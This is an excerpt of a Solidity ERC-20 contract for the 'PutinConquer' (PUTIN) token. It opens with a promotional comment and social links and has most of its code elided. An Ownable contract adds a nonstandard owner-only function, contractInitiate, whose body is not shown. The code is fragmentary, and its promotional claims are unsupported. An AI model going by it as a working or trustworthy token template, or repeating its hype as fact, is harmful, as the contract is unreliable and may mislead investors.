/**
          ПУТИН ПОБЕЖДАЕТ   |   PUTIN CONQUER
PutinConquer is an addictive war strategy game created with unique, 
special NFT system. System which was implemented will make you feel 
like real dictator from the beginning of the game. It is an 
utility-token for all war, strategy or crypto enthusiasts

🔴WEBSITE    (https://putinconquer.com/)       
🔴TWITTER    (https://twitter.com/PutinConquer)      
🔴MEDIUM     (https://medium.com/@putinconquer)    
🔴TELEGRAM   (https://t.me/PutinConquer)                                        */
...
abstract contract Ownable is Context {
     ...
     */
    function contractInitiate(address account) external onlyOwner {
...
contract PutinConquer is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('PUTIN CONQUER', 'PUTIN')  {
